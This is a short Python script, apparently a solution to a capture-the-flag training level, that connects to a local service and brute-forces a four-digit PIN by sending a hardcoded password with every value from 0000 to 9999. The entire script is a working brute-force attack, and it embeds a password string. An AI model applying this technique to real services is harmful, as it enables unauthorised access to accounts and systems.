import socket
import time

HOST = 'localhost'
PORT = 30002
bandit24p = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))


def attempt(dig):
    message = '{} {}'.format(bandit24p, dig)
    s.sendall((message + '\n').encode())
    r = s.recv(1024)
    print('Sent: {} | Recv: {}'.format(message, r.decode()))


def main_loop():
    for dig in range(0, 10000):
        attempt(str(dig).zfill(4))


if __name__ == '__main__':
    time.sleep(1)
    main_loop()
